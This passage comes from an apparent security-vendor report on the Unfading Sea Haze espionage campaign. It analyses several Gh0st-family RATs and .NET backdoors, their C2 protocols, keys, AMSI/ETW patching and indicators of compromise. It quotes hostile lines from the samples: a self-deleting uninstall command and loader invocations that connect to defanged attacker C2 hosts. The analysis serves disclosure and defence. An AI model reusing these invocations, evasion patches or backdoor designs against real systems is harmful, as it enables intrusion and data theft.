combination of .net and PowerShell features, seems to\nbe replaced by a new mechanism of loading the .net payloads using msbuild.exe and C# payloads that use Microsoft.Build.Utilities.\nTask to load and execute the agents.\n\nThe most recent development in delivery of the .net agents is reflected in the sample msdoc.exe\n(md5:124bdaaa70da4daeacbc0513b6c0558e) that decrypts the smb path \\\\154.90.34[.]83\\exchange\\info and intends to create\na process of C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe giving it the smb path as argument so that the\nmsbuild.exe will list the remote folder in order to find a csproj file to load. With the help of such executables, the threat actor will no\nlonger need to store the C# payload that loads the agent on disk.\n\nIn the following section, technical details about the malicious agents used by Unfading Sea Haze are presented.\n\n### Hunting for the Gh0st army\n\nAll the malware families encountered during the investigation, although different, have some common characteristics with the\nGh0stRat family. Besides code similarity, a few samples have RTTI information and strings, making the comparison easier. Here are a\nfew byte sequences related to the known classes that the Gh0stRat uses and that were found in samples used by Unfading Sea Haze:\n\n###### .?AVCKernelManager@@\n\n .?AVCClientSocket@@\n\n .?AVCPluginManager@@\n\n .?AVCManager@@\n\n .?AVCInteractivShellS@@\n\n .?AVCShellExManager@@\n\nBesides that, the main function of the executable of the Gh0st family has a common pattern of starting two threads consecutively\nwhich makes the identification easier.\n\nBased on file attributes of the collected samples, we established an approximative timeline of usage of the tools:\n\n#### EtherealGh0st\n\nThe execution of the EthrealGh0st agent starts with the decryption of c2 addresses and ports, which are base64 encoded strings.\nAfter decoding, a SUB 6 operation is performed on the resulting buffer, and the c2 and port are passed down to establish the\nconnection. Although the port is also encoded, it always has the same value, “Ojo5,” which corresponds to 443 after decryption. Here\nare a few domain and IP addresses extracted from the collected artifacts:\n\nbit.kozow.com\n\nmail.pcygphil.com\n\nmail.bomloginset.com\n\n\n-----\n\nsopho.kozow.com\n\nmessage.ooguy.com\n\n209.97.167.177\n\nairst.giize.com\n\nemployee.mywire.org\n\npayroll.mywire.org\n\nhelpdesk.fxnxs.com\n\nprovider.giize.com\n\nThe execution continues with the initialization of the structure CCoreManager. StartWorkThread parses the C2 address in case the\ndecrypted string contains multiple comma-separated addresses. Then, the connection to the c2 is established using TLS over TCP.\nThis process also includes an authentication in which the agent and the server exchange a few messages of 12 bytes, and one of the\ncriteria is that the first 4 bytes contain “!C\\0\\0”, after which the Shell function is invoked.\n\nThe Shell function will receive strings from the C2 that will be passed to CCoreManager::ShellExecuteA function that will interpret\nthe command accordingly:\n\nThe accepted commands are exit, quit, unistall, exitex and plugin as follows from the image:\n\n\n-----\n\nThe exit commands will stop the agent from running and the uninstall command will execute the following command:\n\n“cmd /c sc query <service>&&net stop <service>&&sc delete <service>&ping 127.0.0.1 -n 5&del /a /f \\”<file\npath>\\””\n\nAll the functionality EtherealG0st has is implemented by the plugin command. After receiving such a command, a new connection to\nthe C2 will be established and in a new thread the new subcommands will be interpreted accordingly:\n\nThe supported subcommands are QUIT, SIZE, STOR and BIT:\n\n**↳** QUIT command will make the thread execution stop.\n\n**↳** BIT command sends back an int value – probably a heartbeat.\n\n**↳** SIZE command returns information about the available plugins.\n\nSTOR command receives a PE executable that will be loaded in memory, representing the plugin itself. A new connection to the C2\nwill be made and the Main export of the loaded PE executable will be invoked:\n\n\n-----\n\nThe TLS encryption is performed by OpenSSL which is embedded into EtherealG0st. Interestingly, all the samples use the OpenSSL\n**0.9.8zg 11 Jun 2015, except for a recently obtained sample 00bcbeb6ffdadc50a931212eff424e19 that uses the version OpenSSL**\n**1.1.1w 11 Sep 2023, meaning that an update of the tool was made in 2023-12-06 based on the compile time and file attribute of the**\nagent.\n\n#### TranslucentGh0st\n\nThe analysis and comparison of EtherealGh0st and TranslucentGh0st showed that TranslucentGh0st is the predecessor of the\nEtherealGh0st. The difference between these two is that TranslucentGh0st uses byte constants to determine the command to\ninterpret.\n\nThe c2 address is base64 encoded and encrypted with a byte-XOR with 0x28 and SUB 0xC. The port is hardcoded into the binary in\nplain. All the obtained samples use the domain mail.simpletra[.]com as C2 and port 443.\n\nCommunication with the C2 is realized over TCP without any encryption.\n\n\n-----\n\nThe Run method will establish a connection to the C2 and an instance of CKernelManager is created that exposes the method\nOnReceive that interprets the command constants – the value 0x27 is the equivalent of the uninstall command of the EtherealGh0st\nand the value 0xb9 is the equivalent of the plugin command:\n\n\n-----\n\nIn the case the command 0xb9 is issued, the Loop_DLL establishes a new connection to the C2 and instantiates CPluginManager that\nexposes the necessary functionality. Its OnReceive method evaluates the commands based on the constants 5, 6, 0xb7 and 0xba –\nthe 0xba being the equivalent of the STOR command from EtherealGh0st – the payload seems to respect the same format. The only\ndifference is that it is decompressed with aPlib before being loaded into the memory:\n\n#### SilentGh0st\n\nSilentGh0st communicates with the C2 over TCP, encrypting the traffic with TLS using “OpenSSL 0.9.8zg 11 Jun 2015”. The C2\naddress is encrypted in the same manner as in TranslucentGh0st - byte-XOR with 0x28 and SUB 0xC.\n\nThe agent implements file manipulation operation as separate subcommand that are listed below:\n\nQUIT Stops the file manipulation operation\n\nLIST Lists a folder\n\nDELE Deletes a file or folder\n\nMOVE Moves operation implemented with SHFileOperationA and FO_MOVE option\n\nRNTO Renames operation using MoveFileA\n\nEXEC Executes a command using WinExec\n\nREST Does nothing\n\nSIZE Returns the size of a file\n\nRETR Uploads a file to the C2\n\nSTOR Downloads a file from the C2\n\nFILE Gets info from a file\n\nXMKD Creates a directory\n\nPLUG_vnc Not implemented\n\nBesides file manipulation, the agent also implements multiple functions exported by special classes such as cshellmanager for\nexecution of cmd.exe commands with the output retrieval or CInteractivShellS - interactive execution with a cmd.exe process\nwhere multiple commands could be sent to the STDIN of the process. The most complex module implemented by the agent is\nCShellExManager. It implements a lot of subcommands described very well by its help message:\n\nHTTPPROXY Http proxy server.\n\nSOCKSPROXY Socks 4&5 proxy server.\n\nCD Changes the current directory\n\n\n-----\n\nDATE Displays the date.\n\nDEL Deletes one or more files.\n\nDIR Displays a list of files and subdirectories in a directory.\n\nHELP Provides Help information for Windows commands.\n\nMD Creates a directory.\n\nMKDIR Creates a directory.\n\nMOVE Moves one or more files from one directory to another directory.\n\nPWD Print working directory.\n\nRD Removes a directory.\n\nREN Renames a file or files.\n\nRENAME Renames a file or files.\n\nTIME Displays the system time.\n\nFILE Get file time and clone file time.\n\nRUN Run a specified program or command.\n\nCONNECT Share a shell to host.\n\nSESSION Enum User Sessions.\n\nEXTENSION local, list, load name, remove name, ps, kill id, killall name.\n\nEXIT Exit.\n\nThe extension functionality uses PE executables loaded in memory that are received from the C2, compressed with aPlib similarly to\nTranslucentGh0st, with the export ExtensionMain.\n\nThe main loop that determines what functionality/module to use is determined by the strings received from the C2:\n\nCommand Details\n\nexit, quit Terminate the agent\n\ngHtn2uAHdeesfS9F Use File manipulation functionality\n\nlYhZ5leSVkJZOsNo Use cshellmanager\n\nP0lMsKp6Glji1Gvt Use CShellExManager\n\noAsNmNor5HaxapDr Proxy functionality\n\nnSqEzgFFqUVYVVOc Use CInteractivShellS\n\nThe only identified C2 used by the SilentGh0st is fc.adswt[.]com.\n\n##### InsidiousGh0st\n\nInsidiousGh0st, C++ version, is modification of SilentGh0st that was stripped from some functionality duplicated in multiple modules,\nmaking the agent simpler.\n\nThe communication is realized using wininet functionality and HTTP. The C2 address is base64 encoded and decrypted with RC4 and\nthe key “11 43 65 27 55 21 c1 df”. The user agent used in http request is also encrypted. The C2 obtained during investigation are:\n\nhttps://dns-log.d-n-s.org[.]uk/\n\nhttp://bitdefenderupdate[.]org:443/\n\nhttp://112.113.112[.]5/\n\nhttps://linklab.blinklab[.]com/\n\nLike SilentGh0st, InsidiousGh0st uses random string for determining the operation to initialize:\n\nCommand Operation\n\nJEoUoUUIAd File listing\n\nzBTwDjEqvi Download of file from C2\n\nsMvIJmfhUv Upload of file to C2\n\nbaGmIMgwql Delete of files and folders\n\nigCPoRyFws Use of CShellManager\n\n\n-----\n\nCShellManager and CShellExManager are the exact functionality seen in SilentGh0st. Even the same help string is present:\n\nCD Changes the current directory.\n\nCOPY Copies one file to another location.\n\nDATE Displays the date.\n\nDEL Deletes one or more files.\n\nDIR Displays a list of files and subdirectories in a directory.\n\nHELP Provides Help information for Windows commands.\n\nMD Creates a directory.\n\nMKDIR Creates a directory.\n\nMOVE Moves one or more files from one directory to another directory.\n\nPWD Print working directory.\n\nRD Removes a directory.\n\nREN Renames a file or files.\n\nRENAME Renames a file or files.\n\nTIME Displays the system time.\n\nFILE Get file time and clone file time.\n\nRUN Run a specified program or command.\n\nSLEEP Show or set sleep time.\n\nEXTENSION Memory tools.\n\nThe EXTENSION subcommand will receive an aPlib compressed PE executable that will be loaded into the memory and the\n**ExtensionMain export will be executed.**\n\n##### InsidiousGh0st C#\n\nA peculiar sample was obtained from the Ps2DLLLoader (md5:e3fb4c2d591a440cfe6419f5a9825e84) - the .net assembly\n0dd4603f7c3a80a2408e458fe58b2e60 is executed with these parameters:\n\n$argv=@(“https://mail.adswt[.]com”, “sessionps1”, “32210”)\n\nThe sample is packed with .netreactor and is in fact an InsidiousGh0st implementation in C#, having the exact same subcommands\nexposed by the so called RemoteShellEx command type. The exact same plugin system is used in the .net agent where PE\nexecutable with ExtensionMain export is loaded in memory using this MemoryModule module (src:https://github.com/wwh1004/\nMemoryModule).\n\n\n-----\n\nThe .NET agent supports a set of functions that are not present in the C++ implementation, such as execution of PowerShell\ncommand directly in the current process, support for socks5 and TCP proxy capability.\n\nThe agent exchanges messages with the C2 by making HTTP POST requests with different paths. For sending messages to the C2 the\nagent uses the URL <c2 url>/content/<random integer between 100 and 1000>:\n\nFor receiving messages from the C2, the agent makes HTTP POST requests with the URL <c2 url>/content/<random integer\n**between 100 and 1000>.**\n\n\n-----\n\n<total length, 4 bytes><the result of AES-CBC-encrypt(<header length, 1 byte><random bytes, header length bytes><GZIP\ncompressed message>)>\n\nThe key and IV for AES are derived from a key seed provided by the Ps2dllLoader:\n\nThe received messages are obtained from http response body and are length-prefixed, the first byte representing the message’s\nlength. Then follows the decryption with AES and the process of determining the offset of the compressed buffer by adding some\nvalues of from the buffer resulting after decryption:\n\nThe communication is initiated by the agent by sending the LoginInfoPacket containing the computer name, username and the local\nIP address. Then the received messages are interpreted as commands where the first bytes identify the command issued by the C2.\n\n\n-----\n\n##### InsidiousGh0st Go\n\nThe most recent sample from InsidiousGh0st family is c:\\users\\public\\downloads\\notea.exe\n(05eb9aa03e1c7a0c1fa6c558bb47f0a3). It is built with Go and has many similarities to the InsidiousGh0st sample implemented in\nC#.\n\nIt was intended to be deployed on an internet-exposed system as it binds to 0.0.0.0 and listens for connections from the attackers.\n\nIn the main function, the bind address and an RSA public key are prepared for further use, then the bind address is passed to the\n**main.Listen function:**\n\nThe main.Listen function checks the bind address string for the indicator that determines the communication protocol to use.\n\nIf bind address contains an “s” character, then the agent will use TLS over TCP. In this case, the existence of the files “server.\n**crt” and “server.key” is checked and if they exist, these files will be used as certificate for TLS communication, otherwise, a new**\ncertificate will be generated. The crypto.tls.Listen function will be used to listen to the provided bind address after deleting all the\n“s” occurrences.\n\nIf the bind address contains an “u” character, then the agent will use QUIC protocol with a generated TLS certificate.\n\nTCP will be used if the bind address contains none of the options listed above.\n\nThe hardcoded bind address specified in the analyzed binary is “0.0.0.0:54498”.\n\nNext, an AES session passphrase is randomly generated before accepting any connection and then, in main.HandleConnection, the\nAES session passphrase is sent to the C2 encrypted with RSA and the public RSA key hardcoded into the binary.\n\nThe messages sent to the C2 respect the same format found in the .NET implementation and have a length-prefixed randomly\ngenerated header followed by the GZIP compressed and AES-CBC encrypted message to send.\n\nIn case of the first message where the AES key seed is sent to the C2, the key will be GZIP compressed and RSA encrypted, then\npacked in the length-prefix format and then sent to the C2.\n\nOtherwise, the message is compressed with GZIP and encrypted with AES256-CBC with the key and IV derived from the AES session\npassphrase. The result is combined with the header and the length-prefixed content is sent. For the AES encryption the module\n**github.com/mervick/aes-everywhere/go/aes256 is used.**\n\nInterestingly, the .NET implementation, in addition to using a hardcoded AES key, uses sha256 and Rfc2898DeriveBytes for deriving\nthe key and IV for AES, which is different from the implementation seen in github.com/mervick/aes-everywhere/go/aes256, which\nuses MD5 over a passphrase and a randomly generated buffer (salt) appended to the beginning of the resulted crypto text.\n\nThe messages received from the C2 respect the same format seen in the .NET implementation – the first 4 bytes represent the length\nof the following content. Then, the content of the indicated length is decrypted with AES256-CBC, and the position of the compressed\nbuffer in the decrypted buffer is established by summing a few bytes from the decrypted buffer.\n\nThe commands implemented by the go agent are handled by specific modules identified by the following command IDs:\n\n\n-----\n\n**Command ID** **Module** **Details**\n\n\n0x17 FileManagerConn Implements file listing, drive listing, file deletion, file\ndownload and file upload\n\n0x18 ShellManagerConn Implements command execution using os go module\n\n0x19 PortmapManagerConn Implements proxy feature\n\n0x1F Socks5ManagerConn Uses github.com/armon/go-socks5 to expose\na socks5 proxy on a given port by calling\nListenAndServe\n\n0x22 PowershellManagerConn Uses github.com/Ne0nd0g/go-clr to execute\npowershell commands within the agent process\n\nEach module handles the subsequent command by the functions listed below:\n\nThe effort of implementing the same functionality in many programming languages suggests that attackers are used to the\nimplemented features. They try to change the exposed tools but maintain the functionality intact.\n\n##### FluffyGh0st\n\nThe FluffyGh0st agent is similar to EthealGh0st and TranslucentGh0st in many respects. Its main function is to load plugins in the\nform of DLLs received from the C2 and interact with the loaded plugins.\n\nThe agent usually uses TCP as a communication protocol, but samples that used TLS over TCP were also identified. For TLS, the\n**OpenSSL 1.1.1w 11 Sep 2023 was used.**\n\nThe implemented commands are mainly used to interact with its plugins. The loading process for a plugin consists of receiving the\ndata from C2 as RC4 encrypted with the hardcoded key used for RC4 decryption 32 34 55 77 82 FB FD DC is the same in all identified\nsamples. A lznt1 decompression is applied over the decrypted buffer before reflectively loading the DLL.\n\nThe decompression is done with RtlDecompressBuffer api call followed by loading the DLL reflectively.\n\n\n-----\n\nThe export function name of a typical plugin is “InstallPlugin”. The loading process and interaction with the plugins is determined by\na few constants:\n\nThe c2 address is found in plain at the end of the .data section. Based on multiple collected samples, it seems that each sample is\ncreated from a template and the only major change is in the region containing the C2 address.\n\nauth.bitdefenderupdate.com\n\ncdn.g8z.net\n\n193.149.129.128\n\nspcg.lunaticfridge.com,167.71.199.105\n\n167.71.199.105\n\nnewy.hifiliving.com\n\n\n-----\n\n### .NET malware zoo\n\nUnfading Sea Haze uses multiple .NET malicious agents to alternate the use of suit of malware written in C++ to minimize the\nexposure of the toolset.\n\nAll the encountered samples were loaded either by the specialized loader Ps2dllLoader or by msbuild.exe set to execute a C# payload\nwith the help of Microsoft.Build.Utilities.Task interface.\n\nThe Ps2dllLoader has been used at least since 2018 and was seen to load all types of .NET agents such as SharpJSHandler,\nSerialPktDoor and many others. It was also used to execute PowerShell scripts set to collect browser data.\n\nFor instance, the msbuild.exe and C# payloads were used in the malicious lnk files from the archives, which we suspect were used to\ngain initial access. The latest development in this type of malware loading was seen in samples that are set to execute msbuild.exe\nwith an SMB share as a parameter, indicating to the msbuild to locate the C# payload on a remote location controlled by the attacker.\n\nAll the .NET assembly are packed using Smart Assembly or .netreactor.\n\n#### Ps2dllLoader\n\nThe Ps2dllLoader is named after its main capability to execute embedded PowerShell scripts in its memory.\n\nUntil recently, the PowerShell scripts extracted from the collected samples were responsible for loading a .NET assembly and invoking\nits functions providing as parameters, information necessary for it to function such as C2 address. However, the recently encountered\nsamples of Ps2dllLoader contain PowerShell scripts that perform cookies collection from browser files.\n\nThe loader starts by loading the common language runtime (CLR) into the process using COM interfaces. The first attempt of CLR\nloading targets the v4.0.30319 runtime:\n\nIf unsuccessful, the next attempt targets the v2.0.50727 runtime:\n\nThe Ps2dllLoader has embedded two .NET assemblies compressed with apLib algorithm, an assembly built for each of the targeted\nruntimes. The .NET assembly is then loaded into the memory and the functions exported by the “a.b” class are used to base64\ndecode the PowerShell script embedded into the loader and to execute the script.\n\nThe samples encountered in 2024 noticed an addition to the embedded resources—the newer Ps2dllLoader version contains four\n.NET assemblies—two built for v2.0.50727 and the other two built for v4.0.30319 runtime. The difference between the binaries built\nfor the same runtime is that one binary performs AMSI patching and ETW patching before executing the PowerShell payload. The\ndecision of what .NET assembly to load depends on the loaded CLR runtime and on a hardcoded flag that indicates if patching of AMSI\nand ETW is necessary.\n\n\n-----\n\n-----\n\nThe selected .NET assembly is loaded and its a.b.d method invoked with the PowerShell script given as a string parameter:\n\nThe patching processes, if configured, take place at the Program.Main() function call.\n\nThe amsi.dll is loaded and the AmsiScanBuffer function is patched by overwriting the first bytes of opcodes:\n\n\n-----\n\nSimilarly to AmsiScanBuffer, the ReportEventW from advapi32.dll is patched too:\n\nBelow are two examples of PowerShell scripts that the Ps2dllLoader had to execute.\n\nThe loading of SerialPktLoader:\n\nThe loading of InsidiousGh0st:\n\n#### SharpJSHandler\n\nOne of the payloads carried by Ps2dllLoader is SharpJSHandler. It, in essence, is a webshell-like tool as suggested by the internal\nname of the final payload – noiis.dll, where iis indicates the agent is, in fact, an alternative for aspx webshells.\n\nThe SharpJSHandler will receive HTTP requests and will execute the encoded Javascript code using Microsoft.JScript library.\n\nThe entry point of the agent is the Invoke method that is called by the PowerShell script embedded into the loader – an example of\nsuch invocation is:\n\n[Program]::Invoke(“http://192.168.148[.]3:59590/config.aspx”,\n“b79606fb3afea5bd1609ed40b622142f1c98125abcfe89a76a661b0e8e343910”)\n\nIt accepts three parameters, although the last is optional:\n\n\n-----\n\n**↳** The second parameter is a password that will be used to validate that the request comes from the attacker.\n\n**↳** The third parameter is the path to the certificate that will be used in case the URL has the HTTPS scheme\n\nIn case HTTPS is chosen, the cert path is mandatory for that, and the following command line is issued to make the necessary system\nsettings:\n\n###### netsh.exe http add sslcert ipport=0.0.0.0:<port> certhash=<cert thumprint> appid=<guid>\n\nHere is a snippet of the setup process from an analyzed sample (some of field and method names where set during the analysis):\n\nThen, the agent starts listening for incoming requests to process:\n\nThe body of the http request should contain a string formatted as URL parameter string where each key=value is separated by “&”.\nThe string is parsed so that the key=value pairs are added to a dictionary that will be passed to the evaluation handler.\n\n\n-----\n\nThe evaluation process is implemented in a separate .NET assembly contained in the SharpJSHandler in base64 encoded form. The\nhelper assembly name is EVAL.Handler:\n\nThe agent calls the Invoke method of the Eval.Handler and provides the password and the dictionary obtained from the http request\nbody. All the given parameters will be used in preparation for calling the Microsoft.JScript.Eval. JScriptEvaluate to execute the\nJavaScript:\n\nBut firstly, a validation of the provided dictionary occurs by checking if there is a key string the sha256 of which is equal to the value\nprovided to the agent as password.\n\n\n-----\n\n**JScript.Eval. JScriptEvaluate:**\n\nThe return value of the JSriptEvaluate is sent back in the http response.\n\nThere are two variations of SharpJSHandler used by the attackers that use cloud services as a means for exchanging information –\none that uses Dropbox and another that uses Onedrive.\n\nThe Dropbox variant is loaded by Ps2dllLoader and invoked as follows:\n\n[Program]::Invoke(“<token>”, “fd2e32ec2b7ff97a9a675e22ac489b045ae9965032ba7ea983fd26d7f34ce247”)\n\nThe invoke method received the token and the password and the agent will periodically obtain the payload from the dropbox, will\nexecute it and will upload the result back to the dropbox:\n\n\n-----\n\nInternally, the Download, Upload and Delete operations are performed using Dropbox http REST api. The remote file containing the\npayload is identify as “{“path”: “/0”}” - after downloading it, it will be decrypted using Rijndael Managed in CBC mode where the key\nis derived using Rfc2898DeriveBytes and the sha256 over the provided password and the salt { 161, 202, 223, 218, 17, 202, 58, 189\n**}.**\n\nThe resulting content will be url decoded, parsed so that a dictionary with the key and value is obtained. The dictionary contains the\nJavaScript code to be executed and the execution is done in the same manner as in the noiis.dll - using EVAL.Handler. The output is\nuploaded back to Dropbox as a remote file identified as {“path”: “/1”}, and the remote file “{“path”: “/0”}” is deleted afterward.\n\nThe Onedrive variant is similar to the Dropbox variant. It is also loaded by the Ps2dllLoader and invoked as follows:\n\n[Program]::Invoke(“<token>”,30)\n\nThen, in infinite loop, the agent will download the payload, will execute the commands and will upload the output to Onedrive:\n\nThe remote file downloaded periodically is “/0/0”. It is expected to be encrypted with Rijndael Managed in CBC mode,\nbut the material from which the key is derived is hardcoded into the agent itself. The Rfc2898DeriveBytes is used with\nSHA256(“10101010100101010101”) and salt {1, 2, 3, 4, 5, 6, 7, 8} with 1000 iterations.\n\nThe resulting content is parsed and passed to the EVAL.Handler. The output is uploaded to onedrive as the file “/0/1” and the initial\nremote file is deleted.\n\n\n-----\n\n#### SerialPktdoor\n\nThe SerialPktdoor, named because of the use of serialized structures for determining the commands to execute, is usually loaded by\nmsbuild.exe with the help of scripts that use Microsoft.Build.Tasks:\n\nThis agent was attempted to be executed by the LNK files from the archives crafter for gaining initial access, but there is evidence\nthat Unfading Sea Haze operators deployed manually scripts containing C# code as c:\\users\\<user>\\appdata\\local\\microsoft\\\n**windows\\caches\\cversions.db and executed it with msbuild.exe.**\n\nThe SerialPktDoor is contained in the script as a byte array encrypted with AES that is subsequently decrypted and loaded into the\nmemory, followed by the invocation of its main function with the necessary arguments:\n\nGetType(“TestApp.Program”).GetMethod(“Main”).Invoke(null,new object[] {new string[]\n{“MTQvMWUwYTZkYjg0M2MvYjdhMC9jL2M2M2QxZDVkMWU=”,”95327”,”anBfYStwaXJqX2wrYGxq”,”320”,”3116”} })\n\nThe Main function expects five arguments:\n\n**↳** The first argument is base64 decoded and ADD 1 is applied to all bytes, resulting in a string (e.g\n\n2502f1b7ec954d0c8b10d0d74e2e6e2f from the example above) - it is not used by the agent\n\n**↳** The second parameter indicates if the C2 address is an IP address or a domain name – if the provided value if greater than 65535,\n\nthen the C2 address is a domain, and it will be resolved\n\n**↳** The third parameter is the encoded C2 address – it is base64 decoded and ADD 3 is applied to the result (e.g msbd.\n\n###### slumbo[.]com)\n\n**↳** The fourth parameter is used to calculate the port to be used to contact the C2 – to the provided value is added 320 and the\n\nresulting value is used as the port\n\n**↳** The fifth parameter indicates if the agent should use TLS over TCP or raw TCP for communication with the C2 – if the value is\n\ngreater than 2001 then TLS will be used\n\nAfter invocation, the agent prepares some information about the infected system to be sent to the C2 such as machine GUID and the\nlocal IP address.\n\nThe SerialPktDoor uses extensively inheritance and polymorphism – the exchanged messages with the C2 are serialized structures\nthat extend a few base types. For instance, each serialized structure extends a type that contains the TypeID and the size of the\nserialized data that follows:\n\n\n-----\n\n<random integer, 4 bytes><packet type, 4 bytes><the remaining data size, 4 bytes>\n\nSo, the agent reads the first 12 bytes from the C2 connection and determines how much data needs to be read to assemble the full\npacket.\n\nThe first packet sent to the C2 was assigned type 0x80 and contained the machine GUID. All subsequent messages are encrypted\nwith AES using the key and IV derived from the machine GUID.\n\nIn a loop, the agent reads the packets and depending on the TypeID the targeted functionality of the agent will be invoked:\n\nPkt Type ID Details\n\n0x88 Sends to the C2 system information such as the local IP address, the C2 address, OS full name, OS version, current\nprocess PID, assigned privileges, current process name, OS architecture, username and domain name\n\n0x8e Creates an instance of PoweShell Tabpage (a new entry in a dictionary with pairs of tabids and System.\nManagement.Automation.PowerShell instances);\n\nThe tabid is received from the C2 and will be used to load PowerShell scripts and execute PowerShell commands\nusing the corresponding System.Management.Automation.PowerShell instance.\n\n0x8f Contains a PowerShell command and a tabid and executes the command using the instance of System.\nManagement.Automation.PowerShell by calling AddCommand(<received psh code>), AddScript(“Out-String”) and\nInvoke;\nThe output is sent back to the C2\n\n0x90 Receives from the C2 a PowerShell script and a tabid and will load the script into the PowerShell instance;\nThe output of the script and the message “this Tabpage has successfully loaded the script named <script name>” is\nsent back to the C2\n\n0x93 Lists the PowerShell script loaded into a particular Tabpage;\nFor each loaded script, a line “The Tabpage has loaded <script count> script: -------------------------------- <psh\nscript name one per line> -------------------------------- “ will be generated or “The Tabpage does not load any\nscript!\\n” will be sent back to the C2;\n\n0x94 Closes the Tabpage by tabid;\n\n0x96 Lists a directory or lists the drives;\n\n0x97 Deletes the indicated directory\n\n0x98 Deletes the indicated file\n\n0x99 Downloads a file from the C2;\nReceives structures that describes a chunk of file content – contains the file path for the file to be written to disk,\nthe offset of the chunk within the file and the content;\nThe chunk size is of 104857600 bytes;\n\n0x9a Uploads a file to the C2;\nReceives a structure describing a chunk of the file – contains the file to be uploaded to the C2;\n\nThe chunk size is of maximum of 104857600 bytes;\n\n0x9e Implements TCP forwarding capability;\nReceives from the C2 the IP:port and creates a manager structure that will connect to the C2, will receive the\ncontent to be forwarded to the connection to IP:port and will send back the C2 the content received from the\nIP:port connection;\n\nThe manager exchanges messages with the C2 over a new connection;\n\nThe packets with type 0xA0 are received from the C2 and packet content will be sent to the IP:port;\n\nThe packet with type 0xA1 is sent to the C2 with the content received from the IP:port;\n\n#### Stubbedoor\n\nThe malware was found within Ps2dllLoaders that invokes the Main function as follows:\n\n[stub.Program]::Main(@(“upupdate.ooguy[.]com”, “443”, “123456”, “41530”))\n\nThe four parameters represent the C2 address, the port, the passphrase used as seed material for deriving AES key and IV and the\nlast parameter representing a sleep time between reconnecting to the C2.\n\nThe string representing the port is checked if it contains the “s” character, and if so, the TLS over TCP will be used. Otherwise, the C2\nwill be contacted over raw TCP.\n\n\n-----\n\ncompresses it with GZIP, and encrypts it with AES.\n\nThe key for AES-CBC and the IV is derived with Rfc2898DeriveBytes from the sha256 over the seed provided as an argument to the\nMain function, and for the salt, the hardcoded value { 49, 84, 113, 56, 25, 34, 100, 9 } will be used.\n\nThe agent exchanges messages in the length-prefixed format where the first 4 bytes of the message represent the length of the data\nthat follows.\n\nThe main capability of the Stubbedoor is to receive from the C2 encrypted .NET assembly, to load them and invoke its Main function:\n\n#### SharpZulip experiment\n\nThe SharpZulip agent was delivered by a Donutloader shellcode responsible for loading the CLR runtime and executing the malware.\n\nThe agent starts by making a patch for the function AmsiScanBuffer using a vectored exception handler and breakpoints:\n\nFor the breakpoint setup, the debug control registers are used:\n\nThe agent instantiates a ZulipApi object by providing the URL, username, and API token. Then, in a loop, the agent pulls the messages\nfrom the stream “NDFUIBNFWDNSA” and checks the subject to determine the commands to execute. If the subject of the message\ncorresponds to “time,” then the sleep time between the messages’ pulling is adjusted by the provided value.\n\nIn case the subject of the message contains the string “ S” then the message content is be parsed by the ConvertDataToDictionary\n\n\n-----\n\nThe dictionary is then passed to the Execute method that combines the payload with the necessary imports and creates a C# code:\n\n\n-----\n\nThe code is dynamically compiled and the Execute method is invoked:\n\nThe output of the invoked method is collected and sent back to the stream as a message with the subject of the initial message but\nwith the substring “_S” replaced with “_R”.\n\nThe original message is deleted.\n\n## Attribution\n\nBitdefender has not been able to attribute the investigated incidents to a publicly known threat actor or group and continues to refer\nto the threat actor as Unfading Sea Haze. Given the focus of the threat actor on government and military organizations from countries\nof the South China Sea, it is very likely that the actor is aligned with China’s interests.\n\nThe utilization of various Gh0st RAT variants is linked to numerous threat actors of Chinese origin, implying that the sharing of closedsource RATs and tools is a prevalent practice among Chinese state-sponsored actors.\n\nThe functionality of running JScript code integrated into SharpJSHandler resembles the invoke command found in the funnyswitch\nbackdoor, reportedly utilized by APT41 according to Positive Technologies. Just like SharpJSHandler, funnyswitch loads the .NET\nassembly Funny.Eval from a base64 encoded string. Funny.Eval includes the Invoke method, which requires three parameters\nsuch as a dictionary containing the payload and a password used to identify the payload within the dictionary. It then executes the\nJScript code with the assistance of the Microsoft.JScript.Vsa library. This makes the Funny.Eval very similar to Eval.Handler used by\n**SharpJSHandler, but the similarities end here, given that funnyswitch embeds numerous additional features.**\n\nNo additional overlaps with APT41’s tooling were discovered, and this resemblance between Funny. Eval and Eval. Handler could\nserve as another indication of code-sharing practices.\n\nBy sharing the discoveries concerning the Unfading Sea Haze, we aim to encourage the cybersecurity community to respond, assist\nin disrupting malicious activity, and further the attribution process to its conclusion.\n\n\n-----\n\n## IOCs\n\n### Hashes\n\nMD5 Malware family\n\ncb95ad8fad82eac1c553cd2d7470100b Ps2dllLoader\n\n19dbf2d82f6f95a73f1529636e775295 SilentGh0st\n\n1ce17f0e2a000a889b3f81e80b95f19f DustyExfilTool\n\ne7433f8a0943a6025d43473990ec8068 TranslucentGh0st\n\n6a0933d08d8d27165f72c53df8f1bf04 DustyExfilTool\n\n1dbcd8d2f5718fa7654f8b5f34b88d43 Loader that uses xyz123xyz for AES decryption\n\nac7b8524098cbb423619706ff617b6a6 Network scanner\n\n95701a74b6b3de68fc375cd08ae8d2c2 SilentGh0st\n\n2e4055e16c1a9274caa182223977eda1 SilentGh0st\n\n7e10d7dd09f5ee2010990701db042f11 WPD USB monitor tool\n\na5af41fda8ef570fda96c64a932d4247 FluffyGh0st\n\n1e55bda0b7eb0aea78577a21f51e8f5c Ps2dllLoader\n\n5421e3cef32e534fa74a26df1c753700 SharpJSHandler, onedrive variant\n\nb3dc2dcb0f2a5661aed1f4e6d9e88bc6 Ps2dllLoader\n\n4d99127e4b1d27a56f7c4b198739176b .Net loader used by Ps2dllLoader\n\n5bd1eb1166da401c470af2b9e204b2d1 .Net loader used by Ps2dllLoader\n\n2c45c1c35c703bb923b558343f00ea34 Ps2dllLoader\n\n70773eb54234c486c46048ade57db45b Stubbedoor\n\n69310040e872806cb2b00d3addb321a7 Ps2dllLoader\n\n35623ba9f8fcbcf0fce96aa2465b0b66 SharpJSHandler\n\n828faccaaf8e70be1c32ae5588d3df12 Ps2dllLoader\n\n4ec62fdd3d02bc9b81a8c78910b8463a Ps2dllLoader\n\ncff31de1b28f6b00d13d15c2be08a982 SharpJSHandler dropbox variant\n\n7ff8a134c1ee44c915339a74e4a2d3ca Ps2dllLoader\n\ne3fb4c2d591a440cfe6419f5a9825e84 Ps2dllLoader\n\n0dd4603f7c3a80a2408e458fe58b2e60 InsidiousGh0st - .Net variant\n\n11c7f264184ed52df4a3836a623845c8 TranslucentGh0st\n\n55a246ace9630b31c43964ebd551e5e2 FluffyGh0st\n\n8c31532f73671995d7f3b6d5814ba726 Ps2dllLoader\n\n5268206fb6c96f614f67cd5d686f42af 